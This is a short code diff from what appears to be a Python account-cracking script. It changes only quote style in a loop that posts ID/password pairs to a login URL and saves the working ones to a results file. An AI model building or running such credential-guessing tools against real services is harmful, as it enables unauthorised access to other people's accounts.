@@ -20,7 +20,7 @@ def search(idu,pw):
                      resp = requests.post(url1,data=da)
                      if 'S' in str(resp.text):
                           print(idu,pwd,'Found Fuck')
-                          usp = f"{idu} : {pwd}"
+                          usp = f'{idu} : {pwd}'
                           ste(usp)
                           r = open('hasilnew.txt','a')
                           r.write('{} : {}\n'.format(idu,pwd))
